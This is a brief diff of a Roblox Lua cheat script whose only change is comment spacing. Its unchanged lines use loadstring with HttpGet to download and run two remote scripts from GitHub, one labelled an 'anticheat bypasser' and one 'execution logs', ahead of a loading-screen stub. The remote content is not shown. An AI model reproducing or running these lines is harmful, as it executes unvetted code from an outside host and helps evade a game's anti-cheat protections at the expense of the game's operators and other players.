@@ -1,12 +1,12 @@
---anticheat bypasser
+-- anticheat bypasser
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/universal-anticheat-bypass/main/script",true))()
 
---execution logs
+-- execution logs
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/scripts/main/polologs",true))()
 
---loading screen
+-- loading screen
 
 -- Services
 local Players = game:GetService("Players")
